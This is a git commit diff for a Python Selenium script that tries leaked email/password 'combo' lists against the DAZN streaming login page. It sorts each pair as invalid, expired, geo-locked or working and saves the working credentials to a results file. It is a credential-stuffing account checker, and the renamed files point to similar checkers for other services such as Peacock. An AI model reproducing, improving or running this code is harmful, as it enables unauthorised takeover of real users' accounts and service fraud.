6e794dda94a7b5ac3713062f287cb38ed96eaa85
g3th <theinkandpen@yahoo.co.uk>
2022-08-07 00:45:32 +0100

    renamed:    split_combos.py -> combo_splitters/split_combos.py 	renamed:    split_dazn_combos.py -> combo_splitters/split_dazn_combos.py 	modified:   dazn.py 	deleted:    dazn_header.py 	new file:   headers/dazn_header.py 	renamed:    peacock_header.py -> headers/peacock_header.py

--- dazn.py
+++ dazn.py
@@ -1,6 +1,7 @@
 import time
-from dazn_header import header
-from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
+import os
+from headers.dazn_header import header
+from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
 from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 from pathlib import Path
@@ -12,7 +13,10 @@ users = []
 passwords = []
 countries = []
 browser_options = Options()
+browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
 browser_options.headless = True
+
+os.makedirs('accounts',exist_ok=True)
 
 with open(file_directory, 'r') as dazn:
 	for line in dazn.readlines():
@@ -22,11 +26,14 @@ with open(file_directory, 'r') as dazn:
 			countries.append(line.split(' | ')[1].strip())
 		except IndexError:
 			continue
+index = 0
 
-for index in range(len(users)):
-	with open('account_results','a') as account_results:
+while index != len(users):
+	if index == 10:
+		header()
+	with open('accounts/dazn_working_accounts','a') as account_results:
 		try:
-			print('\rTrying Combo {} out of {}'.format(index, len(users)),end='')
+			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
 			browser = webdriver.Chrome(options = browser_options)
 			browser.set_window_size(500,700)
 			browser.get(page)
@@ -40,23 +47,34 @@ for index in range(len(users)):
 			email_input_box.send_keys(users[index])
 			password_input_box.send_keys(passwords[index])
 			sign_in_button.click()
-			time.sleep(3)			
-			invalid_email_text = browser.find_element_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span')
-			error = invalid_email_text.text
-			if 'Your email address and/or password are incorrect' in str(error):
-				account_results.write('{}:{} ---> Bad Account\n'.format(users[index],passwords[index]))
+			time.sleep(7)				
+			if browser.find_elements_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
+				error = browser.find_element_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
+				if 'Your email address and/or password are incorrect' in str(error):
+					print(" | {}:{} ---> Credentials don't exist\n".format(users[index],passwords[index]))
+					index += 1
+					browser.close()				
+				if 'You can only access DAZN in the country where you created your account' in str(error):
+					account_results.write('{}:{} ---> Good Account, geo-locked login ({})'.format(users[index], passwords[index], countries[index]))
+					index += 1
+					browser.close()			
+			if browser.find_elements_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):			
+				expired_account_text = browser.find_element_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div').text
+				if 'Welcome back.' in expired_account_text:
+					print(' | {}:{} ---> Account Expired'.format(users[index],passwords[index]))
+					index += 1
+					browser.close()
+					continue
+			else:
+				account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
 				browser.close()
-			if 'You can only access DAZN in the country where you created your account' in str(error):
-				account_results.write('{}:{} ---> Good Account, geo-locked login ({})\n'.format(users[index], passwords[index], countries[index]))
-				browser.close()
-		except NoSuchElementException:		
-			account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
-			browser.close()
+				index += 1
+				continue	
+										
+		except ElementClickInterceptedException:			
+			print(' | Click Intercepted, iteration index was not incremented.')
 			continue
-
-		except Exception as e: #ElementClickInterceptedException:
-		
-			print(e)			
-			continue
-
-
+			
+		except InvalidSessionIdException:
+			print('Session terminated unexpectedly, but combo list was completed.\n')
+			break
